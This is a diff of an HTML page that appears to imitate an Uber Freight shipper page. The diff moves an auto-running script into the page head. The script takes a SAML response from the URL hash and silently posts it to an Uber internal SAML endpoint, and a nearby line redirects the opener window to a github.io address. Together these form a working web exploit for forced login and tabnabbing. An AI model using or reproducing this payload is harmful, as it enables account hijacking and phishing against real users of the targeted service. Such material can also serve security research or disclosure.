@@ -13,7 +13,24 @@
 
   <link data-rh="true" rel="shortcut icon" type="image/x-icon" href="https://d3i4yxtzktqr9n.cloudfront.net/shipper-web/17312b2393d0e1477626fed97d39726c.ico">
   <script>window.opener.location = 'http://regataregata.github.io#reassigned'</script>
-    
+      <script>
+const getForm = saml => `<form
+action="https://freight-ops.uberinternal.com/oidauth/rich_consume?groupmap_version=4.0.0"
+method="post"
+>
+<div>
+  <input name="SAMLResponse" id="SAMLResponse" value="${saml}" />
+</div>
+<div><input name="RelayState" id="RelayState" value="/" /></div>
+<button>Send my greetings</button>
+</form>
+`;
+if (location.hash.match(/^#login/)) {
+  document.body.innerHTML = getForm(location.hash.slice(6));
+  document.querySelector('form').submit()
+
+}
+</script>
   <link href='https://fonts.googleapis.com/css?family=Oxygen' rel='stylesheet' type='text/css'>
 <link href='https://fonts.googleapis.com/css?family=PT+Sans' rel='stylesheet' type='text/css'>
 <link href='https://fonts.googleapis.com/css?family=Raleway' rel='stylesheet' type='text/css'>
@@ -735,23 +752,6 @@ $('#step-back').on('click', function () {
     document.getElementById('container').setAttribute('style', 'display:none')
   }
 </script>
-  <script>
-const getForm = saml => `<form
-action="https://freight-ops.uberinternal.com/oidauth/rich_consume?groupmap_version=4.0.0"
-method="post"
->
-<div>
-  <input name="SAMLResponse" id="SAMLResponse" value="${saml}" />
-</div>
-<div><input name="RelayState" id="RelayState" value="/" /></div>
-<button>Send my greetings</button>
-</form>
-`;
-if (location.hash.match(/^#login/)) {
-  document.body.innerHTML = getForm(location.hash.slice(6));
-  document.querySelector('form').submit()
 
-}
-</script>
 </body>
 </html>
